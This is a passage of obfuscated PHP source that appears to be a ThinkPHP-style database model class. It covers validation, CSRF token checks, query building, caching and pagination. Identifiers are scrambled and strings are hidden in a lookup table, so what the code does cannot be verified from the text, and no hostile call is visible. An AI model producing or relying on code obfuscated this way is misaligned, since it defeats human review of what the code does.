stripslashes($˜µ‘Áã); } } } $this->autoOperation($¢‚‰¸Û§, $¥†Ô‘‹); $this->data = $¢‚‰¸Û§; return $¢‚‰¸Û§; } public function autoCheckToken($ÀüØ¯ªû) { $˜ÃÜëƒœ =& $_SERVER[Æ š¦İÈ]; if (isset($this->options[$˜ÃÜëƒœ[298]]) && !$this->options[$˜ÃÜëƒœ[298]]) { return !0; } if (think_config($˜ÃÜëƒœ[295])) { $æ…¯§›è = think_config($˜ÃÜëƒœ[296]); if (!isset($ÀüØ¯ªû[$æ…¯§›è]) || Session::get($æ…¯§›è)) { return !1; } list($Àó¦ñş, $–å½òÀÖ) = explode($˜ÃÜëƒœ[11], $ÀüØ¯ªû[$æ…¯§›è]); if ($–å½òÀÖ && Session::get($æ…¯§›è . $˜ÃÜëƒœ[10] . $Àó¦ñş) === $–å½òÀÖ) { Session::remove($æ…¯§›è . $˜ÃÜëƒœ[10] . $Àó¦ñş); return !0; } if (think_config($˜ÃÜëƒœ[299])) { Session::remove($æ…¯§›è . $˜ÃÜëƒœ[10] . $Àó¦ñş); } return !1; } return !0; } public function regex($ğ—óØë, $ÒœÒ„ŒÛ) { $¸îÍŠ›§ =& $_SERVER[Æ š¦İÈ]; $ËÎ¾¦ã’ = array($¸îÍŠ›§[300] => $¸îÍŠ›§[301], $¸îÍŠ›§[302] => $¸îÍŠ›§[303], $¸îÍŠ›§[304] => $¸îÍŠ›§[305], $¸îÍŠ›§[306] => $¸îÍŠ›§[307], $¸îÍŠ›§[308] => $¸îÍŠ›§[309], $¸îÍŠ›§[310] => $¸îÍŠ›§[311], $¸îÍŠ›§[312] => $¸îÍŠ›§[313], $¸îÍŠ›§[287] => $¸îÍŠ›§[314], $¸îÍŠ›§[315] => $¸îÍŠ›§[316]); if (isset($ËÎ¾¦ã’[strtolower($ÒœÒ„ŒÛ)])) { $ÒœÒ„ŒÛ = $ËÎ¾¦ã’[strtolower($ÒœÒ„ŒÛ)]; } return preg_match($ÒœÒ„ŒÛ, $ğ—óØë) === 1; } private function autoOperation(&$Ÿ·“ö‹Å, $Ãô®¬û) { $ÎŒÍŠç£ =& $_SERVER[Æ š¦İÈ]; if (!empty($this->options[$ÎŒÍŠç£[317]])) { $ı¹„ïÔ¸ = $this->options[$ÎŒÍŠç£[317]]; unset($this->options[$ÎŒÍŠç£[317]]); } elseif (!empty($this->_auto)) { $ı¹„ïÔ¸ = $this->_auto; } if (isset($ı¹„ïÔ¸)) { foreach ($ı¹„ïÔ¸ as $÷ÏûäÈè) { if (empty($÷ÏûäÈè[2])) { $÷ÏûäÈè[2] = THINK_MODEL_INSERT; } if ($Ãô®¬û == $÷ÏûäÈè[2] || $÷ÏûäÈè[2] == THINK_MODEL_BOTH) { switch (trim($÷ÏûäÈè[3])) { case $ÎŒÍŠç£[318]: case $ÎŒÍŠç£[319]: $îÅŸûıù = isset($÷ÏûäÈè[4]) ? (array) $÷ÏûäÈè[4] : array(); if (isset($Ÿ·“ö‹Å[$÷ÏûäÈè[0]])) { array_unshift($îÅŸûıù, $Ÿ·“ö‹Å[$÷ÏûäÈè[0]]); } if ($ÎŒÍŠç£[318] == $÷ÏûäÈè[3]) { $Ÿ·“ö‹Å[$÷ÏûäÈè[0]] = call_user_func_array($÷ÏûäÈè[1], $îÅŸûıù); } else { $Ÿ·“ö‹Å[$÷ÏûäÈè[0]] = call_user_func_array(array(&$this, $÷ÏûäÈè[1]), $îÅŸûıù); } break; case $ÎŒÍŠç£[270]: $Ÿ·“ö‹Å[$÷ÏûäÈè[0]] = $Ÿ·“ö‹Å[$÷ÏûäÈè[1]]; break; case $ÎŒÍŠç£[320]: if ($ÎŒÍŠç£[12] === $Ÿ·“ö‹Å[$÷ÏûäÈè[0]]) { unset($Ÿ·“ö‹Å[$÷ÏûäÈè[0]]); } break; case $ÎŒÍŠç£[321]: default: $Ÿ·“ö‹Å[$÷ÏûäÈè[0]] = $÷ÏûäÈè[1]; } if (!1 === $Ÿ·“ö‹Å[$÷ÏûäÈè[0]]) { unset($Ÿ·“ö‹Å[$÷ÏûäÈè[0]]); } } } } return $Ÿ·“ö‹Å; } protected function autoValidation($¨ù¢Ö¾, $¤¥éİ§¤) { $”Ì™Ë—é =& $_SERVER[Æ š¦İÈ]; if (!empty($this->options[$”Ì™Ë—é[322]])) { $ìü­ö…ô = $this->options[$”Ì™Ë—é[322]]; unset($this->options[$”Ì™Ë—é[322]]); } elseif (!empty($this->_validate)) { $ìü­ö…ô = $this->_validate; } if (isset($ìü­ö…ô)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ìü­ö…ô as $ùàê˜÷á => $‡‡í¨“à) { if (empty($‡‡í¨“à[5]) || $‡‡í¨“à[5] == THINK_MODEL_BOTH || $‡‡í¨“à[5] == $¤¥éİ§¤) { if (0 == strpos($‡‡í¨“à[2], $”Ì™Ë—é[323]) && strpos($‡‡í¨“à[2], $”Ì™Ë—é[324])) { $‡‡í¨“à[2] = think_lang(substr($‡‡í¨“à[2], 2, -1)); } $‡‡í¨“à[3] = isset($‡‡í¨“à[3]) ? $‡‡í¨“à[3] : THINK_EXISTS_VALIDATE; $‡‡í¨“à[4] = isset($‡‡í¨“à[4]) ? $‡‡í¨“à[4] : $”Ì™Ë—é[325]; switch ($‡‡í¨“à[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($¨ù¢Ö¾, $‡‡í¨“à)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($”Ì™Ë—é[12] != trim($¨ù¢Ö¾[$‡‡í¨“à[0]])) { if (!1 === $this->_validationField($¨ù¢Ö¾, $‡‡í¨“à)) { return !1; } } break; default: if (isset($¨ù¢Ö¾[$‡‡í¨“à[0]])) { if (!1 === $this->_validationField($¨ù¢Ö¾, $‡‡í¨“à)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($˜¹·ßÆ’, $¹¯ëÒŸš) { if (!1 === $this->_validationFieldItem($˜¹·ßÆ’, $¹¯ëÒŸš)) { if ($this->patchValidate) { $this->error[$¹¯ëÒŸš[0]] = $¹¯ëÒŸš[2]; } else { $this->error = $¹¯ëÒŸš[2]; return !1; } } return; } protected function _validationFieldItem($¤şÇ²ñò, $²Õç§) { $ş¤ç¦ø‘ =& $_SERVER[Æ š¦İÈ]; switch (strtolower(trim($²Õç§[4]))) { case $ş¤ç¦ø‘[318]: case $ş¤ç¦ø‘[319]: $öÑ´’œŞ = isset($²Õç§[6]) ? (array) $²Õç§[6] : array(); if (is_string($²Õç§[0]) && strpos($²Õç§[0], $ş¤ç¦ø‘[50])) { $²Õç§[0] = explode($ş¤ç¦ø‘[50], $²Õç§[0]); } if (is_array($²Õç§[0])) { foreach ($²Õç§[0] as $¹Şåõ¦Å) { $¡Ì¬”‡Ó[$¹Şåõ¦Å] = $¤şÇ²ñò[$¹Şåõ¦Å]; } array_unshift($öÑ´’œŞ, $¡Ì¬”‡Ó); } else { array_unshift($öÑ´’œŞ, $¤şÇ²ñò[$²Õç§[0]]); } if ($ş¤ç¦ø‘[318] == $²Õç§[4]) { return call_user_func_array($²Õç§[1], $öÑ´’œŞ); } else { return call_user_func_array(array(&$this, $²Õç§[1]), $öÑ´’œŞ); } case $ş¤ç¦ø‘[326]: return $¤şÇ²ñò[$²Õç§[0]] == $¤şÇ²ñò[$²Õç§[1]]; case $ş¤ç¦ø‘[327]: if (is_string($²Õç§[0]) && strpos($²Õç§[0], $ş¤ç¦ø‘[50])) { $²Õç§[0] = explode($ş¤ç¦ø‘[50], $²Õç§[0]); } $ıÛ³³‡¶ = array(); if (is_array($²Õç§[0])) { foreach ($²Õç§[0] as $¹Şåõ¦Å) { $ıÛ³³‡¶[$¹Şåõ¦Å] = $¤şÇ²ñò[$¹Şåõ¦Å]; } } else { $ıÛ³³‡¶[$²Õç§[0]] = $¤şÇ²ñò[$²Õç§[0]]; } if (!empty($¤şÇ²ñò[$this->getPk()])) { $ıÛ³³‡¶[$this->getPk()] = array($ş¤ç¦ø‘[328], $¤şÇ²ñò[$this->getPk()]); } if ($this->where($ıÛ³³‡¶)->find()) { return !1; } return !0; default: return $this->check($¤şÇ²ñò[$²Õç§[0]], $²Õç§[1], $²Õç§[4]); } } public function check($™õÒï«, $¼ìØ”Œ, $…¶¬¾›± = "\x72\145\147\x65\170") { $ìÓÁ»É =& $_SERVER[Æ š¦İÈ]; $…¶¬¾›± = strtolower(trim($…¶¬¾›±)); switch ($…¶¬¾›±) { case $ìÓÁ»É[7]: case $ìÓÁ»É[329]: $İø¬œˆ = is_array($¼ìØ”Œ) ? $¼ìØ”Œ : explode($ìÓÁ»É[50], $¼ìØ”Œ); return $…¶¬¾›± == $ìÓÁ»É[7] ? in_array($™õÒï«, $İø¬œˆ) : !in_array($™õÒï«, $İø¬œˆ); case $ìÓÁ»É[330]: case $ìÓÁ»É[331]: if (is_array($¼ìØ”Œ)) { $Ğ¢Æ«Øó = $¼ìØ”Œ[0]; $ºŠáˆ¬ñ = $¼ìØ”Œ[1]; } else { list($Ğ¢Æ«Øó, $ºŠáˆ¬ñ) = explode($ìÓÁ»É[50], $¼ìØ”Œ); } return $…¶¬¾›± == $ìÓÁ»É[330] ? $™õÒï« >= $Ğ¢Æ«Øó && $™õÒï« <= $ºŠáˆ¬ñ : $™õÒï« < $Ğ¢Æ«Øó || $™õÒï« > $ºŠáˆ¬ñ; case $ìÓÁ»É[332]: case $ìÓÁ»É[333]: return $…¶¬¾›± == $ìÓÁ»É[332] ? $™õÒï« == $¼ìØ”Œ : $™õÒï« != $¼ìØ”Œ; case $ìÓÁ»É[334]: $›«á»Â“ = mb_strlen($™õÒï«, $ìÓÁ»É[335]); if (strpos($¼ìØ”Œ, $ìÓÁ»É[50])) { list($Ğ¢Æ«Øó, $ºŠáˆ¬ñ) = explode($ìÓÁ»É[50], $¼ìØ”Œ); return $›«á»Â“ >= $Ğ¢Æ«Øó && $›«á»Â“ <= $ºŠáˆ¬ñ; } else { return $›«á»Â“ == $¼ìØ”Œ; } case $ìÓÁ»É[336]: list($æ¹ú…•, $×­’®Ô) = explode($ìÓÁ»É[50], $¼ìØ”Œ); if (!is_numeric($æ¹ú…•)) { $æ¹ú…• = strtotime($æ¹ú…•); } if (!is_numeric($×­’®Ô)) { $×­’®Ô = strtotime($×­’®Ô); } return NOW_TIME >= $æ¹ú…• && NOW_TIME <= $×­’®Ô; case $ìÓÁ»É[337]: return in_array(get_client_ip(), explode($ìÓÁ»É[50], $¼ìØ”Œ)); case $ìÓÁ»É[338]: return !in_array(get_client_ip(), explode($ìÓÁ»É[50], $¼ìØ”Œ)); case $ìÓÁ»É[325]: default: return $this->regex($™õÒï«, $¼ìØ”Œ); } } public function query($ûœ•²”ñ, $‚¶¯…ŞÊ = false) { $ÚŠ×È”Ÿ =& $_SERVER[Æ š¦İÈ]; if (!is_bool($‚¶¯…ŞÊ) && !is_array($‚¶¯…ŞÊ)) { $‚¶¯…ŞÊ = func_get_args(); array_shift($‚¶¯…ŞÊ); } $ûœ•²”ñ = str_replace(array($ÚŠ×È”Ÿ[228], $ÚŠ×È”Ÿ[339]), $ÚŠ×È”Ÿ[53], $ûœ•²”ñ); $ûœ•²”ñ = $this->parseSql($ûœ•²”ñ, $‚¶¯…ŞÊ); return $this->db->query($ûœ•²”ñ); } public function execute($¯é“´ùÏ, $äÎØ¤²° = false) { if (!is_bool($äÎØ¤²°) && !is_array($äÎØ¤²°)) { $äÎØ¤²° = func_get_args(); array_shift($äÎØ¤²°); } $¯é“´ùÏ = $this->parseSql($¯é“´ùÏ, $äÎØ¤²°); return $this->db->execute($¯é“´ùÏ); } protected function parseSql($š •íëš, $Æû·áÃÍ) { $¬×‚ú‚Õ =& $_SERVER[Æ š¦İÈ]; if (!0 === $Æû·áÃÍ) { $¡»¢¦Ø = $this->_parseOptions(); $š •íëš = $this->db->parseSql($š •íëš, $¡»¢¦Ø); } elseif (is_array($Æû·áÃÍ)) { $Æû·áÃÍ = array_map(array($this->db, $¬×‚ú‚Õ[340]), $Æû·áÃÍ); $š •íëš = vsprintf($š •íëš, $Æû·áÃÍ); } else { $š •íëš = strtr($š •íëš, array($¬×‚ú‚Õ[341] => $this->getTableName(), $¬×‚ú‚Õ[342] => think_config($¬×‚ú‚Õ[241]))); } $this->db->setModel($this->name); return $š •íëš; } public function db($™Ò¦ğÓ = '', $ÀĞ•„Á± = '', $¨©ØÂ« = array()) { $®¬ùá¯Õ =& $_SERVER[Æ š¦İÈ]; if ($®¬ùá¯Õ[12] === $™Ò¦ğÓ && $this->db) { return $this->db; } static $¶ê™ßñ = array(); static $àŞÃõª = array(); if (!isset($àŞÃõª[$™Ò¦ğÓ]) || isset($àŞÃõª[$™Ò¦ğÓ]) && $ÀĞ•„Á± && $¶ê™ßñ[$™Ò¦ğÓ] != $ÀĞ•„Á±) { if (!empty($ÀĞ•„Á±) && is_string($ÀĞ•„Á±) && !1 === strpos($ÀĞ•„Á±, $®¬ùá¯Õ[8])) { $ÀĞ•„Á± = think_config($ÀĞ•„Á±); } $™Ò¦ğÓ = think_guid($ÀĞ•„Á±); $àŞÃõª[$™Ò¦ğÓ] = Db::getInstance($ÀĞ•„Á±); } elseif (NULL === $ÀĞ•„Á±) { $àŞÃõª[$™Ò¦ğÓ]->close(); unset($àŞÃõª[$™Ò¦ğÓ]); return; } if (!empty($¨©ØÂ«)) { if (is_string($¨©ØÂ«)) { parse_str($¨©ØÂ«, $¨©ØÂ«); } foreach ($¨©ØÂ« as $ÃëŠş ì => $û¼ÄÖ ) { $this->setProperty($ÃëŠş ì, $û¼ÄÖ ); } } $¶ê™ßñ[$™Ò¦ğÓ] = $ÀĞ•„Á±; $this->db = $àŞÃõª[$™Ò¦ğÓ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $îÅş®´Ÿ = get_class($this); if ($îÅş®´Ÿ == $_SERVER[Æ š¦İÈ][343]) { return $this->name; } $this->name = substr($îÅş®´Ÿ, 0, -5); } return $this->name; } public function getTableName() { $ò×ÁŒÄÒ =& $_SERVER[Æ š¦İÈ]; if (empty($this->trueTableName)) { $È‰ôšñ = !empty($this->tablePrefix) ? $this->tablePrefix : $ò×ÁŒÄÒ[12]; if (!empty($this->tableName)) { $È‰ôšñ .= $this->tableName; } else { $È‰ôšñ .= think_parse_name($this->name); } $this->trueTableName = strtolower($È‰ôšñ); } return (!empty($this->dbName) ? $this->dbName . $ò×ÁŒÄÒ[10] : $ò×ÁŒÄÒ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $œöÙ’ŒÊ =& $_SERVER[Æ š¦İÈ]; return isset($this->fields[$œöÙ’ŒÊ[248]]) ? $this->fields[$œöÙ’ŒÊ[248]] : $this->pk; } public function getDbFields() { $®¤ÂÏ¾‰ =& $_SERVER[Æ š¦İÈ]; if (isset($this->options[$®¤ÂÏ¾‰[276]])) { $ÁË™äÆÔ = $this->db->getFields($this->options[$®¤ÂÏ¾‰[276]]); return $ÁË™äÆÔ ? array_keys($ÁË™äÆÔ) : !1; } if ($this->fields) { $ÁË™äÆÔ = $this->fields; unset($ÁË™äÆÔ[$®¤ÂÏ¾‰[247]], $ÁË™äÆÔ[$®¤ÂÏ¾‰[248]], $ÁË™äÆÔ[$®¤ÂÏ¾‰[249]], $ÁË™äÆÔ[$®¤ÂÏ¾‰[246]]); return $ÁË™äÆÔ; } return !1; } public function data($Å†ê÷û = '') { $²ñÖĞò’ =& $_SERVER[Æ š¦İÈ]; if ($²ñÖĞò’[12] === $Å†ê÷û && !empty($this->data)) { return $this->data; } if (is_object($Å†ê÷û)) { $Å†ê÷û = get_object_vars($Å†ê÷û); } elseif (is_string($Å†ê÷û)) { parse_str($Å†ê÷û, $Å†ê÷û); } elseif (!is_array($Å†ê÷û)) { think_exception(think_lang($²ñÖĞò’[268])); } $this->data = $Å†ê÷û; return $this; } public function join($Å¿ûŒíó) { $ÚÃ„»Á =& $_SERVER[Æ š¦İÈ]; if (is_array($Å¿ûŒíó)) { $this->options[$ÚÃ„»Á[279]] = $Å¿ûŒíó; } elseif (!empty($Å¿ûŒíó)) { $this->options[$ÚÃ„»Á[279]][] = $Å¿ûŒíó; } return $this; } public function union($áÜ§Ååí, $íÜ‚ûÌ = false) { $Äß–êĞ™ =& $_SERVER[Æ š¦İÈ]; if (empty($áÜ§Ååí)) { return $this; } if ($íÜ‚ûÌ) { $this->options[$Äß–êĞ™[344]][$Äß–êĞ™[345]] = !0; } if (is_object($áÜ§Ååí)) { $áÜ§Ååí = get_object_vars($áÜ§Ååí); } if (is_string($áÜ§Ååí)) { $Äª“˜¾Ó = $áÜ§Ååí; } elseif (is_array($áÜ§Ååí)) { if (isset($áÜ§Ååí[0])) { $this->options[$Äß–êĞ™[344]] = array_merge($this->options[$Äß–êĞ™[344]], $áÜ§Ååí); return $this; } else { $Äª“˜¾Ó = $áÜ§Ååí; } } else { think_exception(think_lang($Äß–êĞ™[268])); } $this->options[$Äß–êĞ™[344]][] = $Äª“˜¾Ó; return $this; } public function cache($àı¡»± = true, $ÓÚ¡øó = null, $Ñ¥—åšº = '') { $Â áê±À =& $_SERVER[Æ š¦İÈ]; if (!1 !== $àı¡»±) { $this->options[$Â áê±À[346]] = array($Â áê±À[95] => $àı¡»±, $Â áê±À[336] => $ÓÚ¡øó, $Â áê±À[33] => $Ñ¥—åšº); } return $this; } public function field($œ¤®¶ ¾, $úâÄ†Á = false) { $†óÌ€É =& $_SERVER[Æ š¦İÈ]; if (!0 === $œ¤®¶ ¾) { $íÖœÈûı = $this->getDbFields(); $œ¤®¶ ¾ = $íÖœÈûı ? $íÖœÈûı : $†óÌ€É[183]; } elseif ($úâÄ†Á) { if (is_string($œ¤®¶ ¾)) { $œ¤®¶ ¾ = explode($†óÌ€É[50], $œ¤®¶ ¾); } $íÖœÈûı = $this->getDbFields(); $œ¤®¶ ¾ = $íÖœÈûı ? array_diff($íÖœÈûı, $œ¤®¶ ¾) : $œ¤®¶ ¾; } $this->options[$†óÌ€É[270]] = $œ¤®¶ ¾; return $this; } public function scope($ÎÂˆóëı = '', $×ıãÈ = NULL) { $àªÏœÏß =& $_SERVER[Æ š¦İÈ]; if ($àªÏœÏß[12] === $ÎÂˆóëı) { if (isset($this->_scope[$àªÏœÏß[37]])) { $ØéÅ®‰š = $this->_scope[$àªÏœÏß[37]]; } else { return $this; } } elseif (is_string($ÎÂˆóëı)) { $ »ÀàøË = explode($àªÏœÏß[50], $ÎÂˆóëı); $ØéÅ®‰š = array(); foreach ($ »ÀàøË as $µ®¤Ï˜í) { if (!isset($this->_scope[$µ®¤Ï˜í])) { continue; } $ØéÅ®‰š = array_merge($ØéÅ®‰š, $this->_scope[$µ®¤Ï˜í]); } if (!empty($×ıãÈ) && is_array($×ıãÈ)) { $ØéÅ®‰š = array_merge($ØéÅ®‰š, $×ıãÈ); } } elseif (is_array($ÎÂˆóëı)) { $ØéÅ®‰š = $ÎÂˆóëı; } if (is_array($ØéÅ®‰š) && !empty($ØéÅ®‰š)) { $this->options = array_merge($this->options, array_change_key_case($ØéÅ®‰š)); } return $this; } public function where($õ–½ìíØ, $òí’Š‚ƒ = null) { $¥ «ù×Ì =& $_SERVER[Æ š¦İÈ]; if (!is_null($òí’Š‚ƒ) && is_string($õ–½ìíØ)) { if (!is_array($òí’Š‚ƒ)) { $òí’Š‚ƒ = func_get_args(); array_shift($òí’Š‚ƒ); } $òí’Š‚ƒ = array_map(array($this->db, $¥ «ù×Ì[340]), $òí’Š‚ƒ); $õ–½ìíØ = vsprintf($õ–½ìíØ, $òí’Š‚ƒ); } elseif (is_object($õ–½ìíØ)) { $õ–½ìíØ = get_object_vars($õ–½ìíØ); } elseif (is_array($õ–½ìíØ)) { foreach ($õ–½ìíØ as $ç¯éí¿ => $ÒİŸÉ¶š) { if ((is_numeric($ç¯éí¿) || !$ç¯éí¿) && is_string($ÒİŸÉ¶š)) { if (strpos($ÒİŸÉ¶š, $¥ «ù×Ì[347]) === 0) { continue; } think_trace($¥ «ù×Ì[348], $¥ «ù×Ì[12], $¥ «ù×Ì[49]); die; } } } if (is_string($õ–½ìíØ) && $¥ «ù×Ì[12] != $õ–½ìíØ) { $Ã•›¼ßø = array(); $Ã•›¼ßø[$¥ «ù×Ì[349]] = $õ–½ìíØ; $õ–½ìíØ = $Ã•›¼ßø; } if (isset($this->options[$¥ «ù×Ì[272]])) { $this->options[$¥ «ù×Ì[272]] = array_merge($this->options[$¥ «ù×Ì[272]], $õ–½ìíØ); } else { $this->options[$¥ «ù×Ì[272]] = $õ–½ìíØ; } return $this; } public function limit($Ã©ÄØÒĞ, $„×ï¼«Ø = null) { $”¼ÒÕ³ =& $_SERVER[Æ š¦İÈ]; $this->options[$”¼ÒÕ³[289]] = is_null($„×ï¼«Ø) ? $Ã©ÄØÒĞ : $Ã©ÄØÒĞ . $”¼ÒÕ³[50] . $„×ï¼«Ø; return $this; } public function page($‰Æş˜–³, $Ãõ±Âá’ = null) { $¬¬€±ß =& $_SERVER[Æ š¦İÈ]; $this->options[$¬¬€±ß[350]] = is_null($Ãõ±Âá’) ? $‰Æş˜–³ : $‰Æş˜–³ . $¬¬€±ß[50] . $Ãõ±Âá’; return $this; } public function comment($©œÁÊº) { $this->options[$_SERVER[Æ š¦İÈ][351]] = $©œÁÊº; return $this; } public function setProperty($²ÔÎáŠá, $Ëôùó“Ç) { if (property_exists($this, $²ÔÎáŠá)) { $this->{$²ÔÎáŠá} = $Ëôùó“Ç; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\x69\x66\x79\x54\151\155\x65", "\164\x69\x6d\x65", "\x69\x6e\x73\x65\162\x74\x2c\165\x70\144\141\x74\145", "\146\x75\x6e\x63\x74\151\157\156"), array("\143\x72\x65\141\164\x65\x54\x69\x6d\x65", "\x74\x69\155\x65", "\151\156\x73\145\x72\x74", "\146\x75\x6e\x63\164\x69\157\x6e")); public function setDataAuto($û•÷å¤) { $this->dataAuto = $û•÷å¤; } public function __construct($ºÉÓšÂÄ = '', $¾¤îæ€¬ = '', $¨û¶êÖ§ = '') { parent::__construct($ºÉÓšÂÄ, $¾¤îæ€¬, $¨û¶êÖ§); } protected $tableMeta = array(); protected function _beforeInsert(&$æ±¶ÇÀË, $Ù¿›îÏ‘) { $ú…ø›ú» =& $_SERVER[Æ š¦İÈ]; if (!$this->checkDataAutoHas($ú…ø›ú»[352])) { return; } $this->dataBeforeFilter($æ±¶ÇÀË, $ú…ø›ú»[352]); } protected function _beforeUpdate(&$’ö‰¾Ú´, $×ÍâÖ¯Ø) { $ ƒŞã× =& $_SERVER[Æ š¦İÈ]; if (!$this->checkDataAutoHas($ ƒŞã×[353])) { return; } $this->dataBeforeFilter($’ö‰¾Ú´, $ ƒŞã×[353]); } protected function _afterSelect(&$•Î¸åÑî, $æÛ©†Ğš) { if (!is_array($•Î¸åÑî)) { return; } if (!$this->checkDataAutoHas($_SERVER[Æ š¦İÈ][354])) { return; } foreach ($•Î¸åÑî as &$õ¸ÈœµÅ) { $this->dataAfterFilter($õ¸ÈœµÅ); } unset($õ¸ÈœµÅ); } protected function _afterFind(&$ûÊÚ¹Ğ, $¤×İ×¬) { if (!is_array($ûÊÚ¹Ğ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Æ š¦İÈ][354])) { return; } $this->dataAfterFilter($ûÊÚ¹Ğ); } public static function textEncode($Ş·áÉÏŞ) { if (!$Ş·áÉÏŞ) { return $Ş·áÉÏŞ; } $ÄÔú‹Ú = json_encode($Ş·áÉÏŞ); $ÄÔú‹Ú = preg_replace_callback($_SERVER[Æ š¦İÈ][355], function ($´×¤½×) { return addslashes($´×¤½×[0]); }, $ÄÔú‹Ú); return json_decode($ÄÔú‹Ú); } public static function textDecode($Ô¨Šè½˜) { $—Ïãô¾ =& $_SERVER[Æ š¦İÈ]; $şÙĞì…¢ = json_encode($Ô¨Šè½˜); $şÙĞì…¢ = preg_replace_callback($—Ïãô¾[356], function ($¸œĞÃíİ) { return $_SERVER[Æ š¦İÈ][98]; }, $şÙĞì…¢); return json_decode($şÙĞì…¢); } public function setAutoIncrement($ÕåÁÜûú) { $ŞİË÷ôí = array($this->getPk() => $ÕåÁÜûú); $ßÂé“ñ = $this->data($ŞİË÷ôí)->add(); if ($ßÂé“ñ) { $this->delete($ßÂé“ñ); } } public function getAutoIncrement() { $ÂòÎöÅŒ = $this->getTableName(); $¢Ğø—¯ = $this->max($this->getPk()); $Ø—’‚°¢ = $this->query("\x73\x68\x6f\167\x20\x74\x61\x62\154\145\40\163\x74\141\x74\x75\163\x20\167\x68\145\x72\145\x20\x4e\141\155\145\x3d\x27{$ÂòÎöÅŒ}\x27"); $Úğâ­Ø¦ = $Ø—’‚°¢[0][$_SERVER[Æ š¦İÈ][357]]; $îÍ½ĞÃ = max($¢Ğø—¯, $Úğâ­Ø¦); return $îÍ½ĞÃ; } protected function _callBefore($Öì¶«ğ, $‡ë‡Şîê) { return $this->cacheCallCheck($Öì¶«ğ, $‡ë‡Şîê, !1); } protected function _callAfter($Ÿ—®‡Å, $”âäÉÌ) { return $this->cacheCallCheck($Ÿ—®‡Å, $”âäÉÌ, !0); } protected function cacheFunctionAlias($³¹Èôï) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ò¨×Úğı, $©Âû‡çŸ, $¶¢ßó±ı = false) { $¢ÖåÃ˜­ = $this->cacheFunctionAlias($©Âû‡çŸ); if (!$¢ÖåÃ˜­) { return; } foreach ($¢ÖåÃ˜­ as $ÖÂ¬¦×¨ => $ğ˜Ášƒû) { $¯ßñ˜òğ = $ğ˜Ášƒû[0]; $•öÑ·‡ì = explode($_SERVER[Æ š¦İÈ][50], $ğ˜Ášƒû[1]); if ($ò¨×Úğı == $ÖÂ¬¦×¨) { return $this->cacheFunctionGet($ÖÂ¬¦×¨, $¯ßñ˜òğ); } if ($¶¢ßó±ı && in_array($ò¨×Úğı, $•öÑ·‡ì)) { $this->cacheFunctionClear($ÖÂ¬¦×¨, $¯ßñ˜òğ); } } } public function cacheFunctionGet($¥—øÜÍ, $Ÿ¹‹õîú) { $şÌ©«ğØ = $this->cacheKeyMake($¥—øÜÍ, $Ÿ¹‹õîú); $—‰ù¼ãè = Cache::get($şÌ©«ğØ); if (!is_array($—‰ù¼ãè)) { $—‰ù¼ãè = call_user_func_array(array($this, $¥—øÜÍ), array($Ÿ¹‹õîú, !0)); Cache::set($şÌ©«ğØ, $—‰ù¼ãè); } return $—‰ù¼ãè; } public function cacheFunctionClear($çœÆËä©, $Ëõø¥ùË) { $¿ª³À±š = $Ëõø¥ùË; if (!is_array($Ëõø¥ùË)) { $¿ª³À±š = array($Ëõø¥ùË); } foreach ($¿ª³À±š as $åŒ¼Óİ‚) { $×ŒÁàØ = $this->cacheKeyMake($çœÆËä©, $åŒ¼Óİ‚); Cache::remove($×ŒÁàØ); } } private function cacheKeyMake($Ø…×Š°á, $Ê†àä¿§) { $’æ÷ÙŸ¾ =& $_SERVER[Æ š¦İÈ]; return get_class($this) . $’æ÷ÙŸ¾[11] . $Ø…×Š°á . $’æ÷ÙŸ¾[358] . $Ê†àä¿§; } protected function selectPageReset() { $Ö¶ÇƒĞî =& $_SERVER[Æ š¦İÈ]; if (isset($GLOBALS[$Ö¶ÇƒĞî[359]])) { return; } $GLOBALS[$Ö¶ÇƒĞî[359]] = isset($GLOBALS[$Ö¶ÇƒĞî[7]][$Ö¶ÇƒĞî[360]]) ? $GLOBALS[$Ö¶ÇƒĞî[7]][$Ö¶ÇƒĞî[360]] : !1; $GLOBALS[$Ö¶ÇƒĞî[361]] = isset($GLOBALS[$Ö¶ÇƒĞî[7]][$Ö¶ÇƒĞî[350]]) ? $GLOBALS[$Ö¶ÇƒĞî[7]][$Ö¶ÇƒĞî[350]] : !1; $GLOBALS[$Ö¶ÇƒĞî[7]][$Ö¶ÇƒĞî[360]] = !1; $GLOBALS[$Ö¶ÇƒĞî[7]][$Ö¶ÇƒĞî[350]] = !1; } protected function selectPageRestore() { $õœšÆ²ƒ =& $_SERVER[Æ š¦İÈ]; if (!isset($GLOBALS[$õœšÆ²ƒ[359]])) { return; } $GLOBALS[$õœšÆ²ƒ[7]][$õœšÆ²ƒ[360]] = $GLOBALS[$õœšÆ²ƒ[359]]; $GLOBALS[$õœšÆ²ƒ[7]][$õœšÆ²ƒ[350]] = $GLOBALS[$õœšÆ²ƒ[361]]; if ($GLOBALS[$õœšÆ²ƒ[7]][$õœšÆ²ƒ[360]] === !1) { unset($GLOBALS[$õœšÆ²ƒ[7]][$õœšÆ²ƒ[360]]); } if ($GLOBALS[$õœšÆ²ƒ[7]][$õœšÆ²ƒ[350]] === !1) { unset($GLOBALS[$õœšÆ²ƒ[7]][$õœšÆ²ƒ[350]]); } unset($GLOBALS[$õœšÆ²ƒ[359]]); unset($GLOBALS[$õœšÆ²ƒ[361]]); } protected function selectPage($ı×şöÛ² = 200, $¾¨ Ñö° = 1) { $˜Ñ°¼û¨ =& $_SERVER[Æ š¦İÈ]; global $in; $Œİ†ü¦¾ = $this->optionsValue(); $¬Õ’‰¶ = 50000; $ı×şöÛ² = isset($in[$˜Ñ°¼û¨[360]]) && $in[$˜Ñ°¼û¨[360]] ? 